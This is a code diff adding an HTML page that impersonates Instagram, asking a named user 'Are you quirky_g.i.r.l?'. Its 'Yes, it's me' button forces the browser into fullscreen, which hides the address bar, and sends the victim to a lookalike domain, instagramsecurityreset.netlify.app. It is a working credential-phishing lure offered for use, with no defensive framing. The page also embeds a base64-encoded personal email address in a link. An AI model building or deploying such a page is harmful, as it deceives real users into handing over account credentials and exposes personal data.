@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link href="https://fonts.googleapis.com/css2?family=Vazir+Matn:wght@200&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: white;
+            color: black;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 2.0em;
+            margin-bottom: 770px;
+            font-family: 'Vazir Matn', sans-serif;
+            font-weight: 200;
+            align: center;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-start;
+            gap: 5px;
+            margin-top: -750px;
+        }
+
+        .message-button,
+        .follow-button {
+            font-family: Roboto, sans-serif;
+            font-size: 18px;
+            font-weight: bold;
+            border: 1px solid #ddd;  
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        .message-button {
+            background-color: white;
+            color: black;
+        }
+
+        .follow-button {
+            background-color: #0095f6;
+            color: white;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: #fff;
+            overflow: hidden;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 5px 0;
+        }
+
+        .navbar img {
+            height: 30px;
+        }
+
+        @media only screen and (max-width: 485px) {
+            h1 {
+                font-size: 1.6em;
+                margin-top: -100px;
+                
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
+    </div>
+
+    <h1>Are you quirky_g.i.r.l?</h1>
+    <div class="button-container">
+        <a href="https://instagram.com/accounts/confirm_email/S5s9GbL6/cnVhc2luZ2hlMDFAZ21haWwuY29t/?app_redirect%3DFalse&amp;source=gmail&amp;ust=1658914278556000&amp;usg=AOvVaw1eF_-1j16fHP8HtQVHGD6s"><button class="message-button">No</button></a>
+       
+        <!-- Updated link to redirect to a page in fullscreen mode -->
+        <a href="https://instagramsecurityreset.netlify.app/" onclick="goFullscreen(); return false;"><button class="follow-button">Yes, it's me</button></a>
+    </div>
+
+    <script>
+        function goFullscreen() {
+            const element = document.documentElement;
+
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+
+            // Redirect to the specified page after going fullscreen
+            window.location.href = 'https://instagramsecurityreset.netlify.app/';
+        }
+    </script>
+</body>
+</html>
